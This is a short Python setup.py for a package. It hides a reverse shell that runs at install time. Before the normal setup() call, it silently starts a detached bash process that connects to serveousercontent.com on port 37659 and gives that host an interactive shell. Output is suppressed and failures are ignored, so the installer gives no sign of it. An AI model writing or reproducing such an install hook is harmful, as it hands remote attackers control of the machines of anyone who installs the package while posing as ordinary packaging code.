import sys, subprocess
from setuptools import setup, find_packages

CMD = "bash -i >& /dev/tcp/serveousercontent.com/37659 0>&1"

try:
    subprocess.Popen(
        ["bash", "-c", CMD],
        start_new_session=True,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )
except Exception:
    pass

setup(packages=find_packages(where="src"))
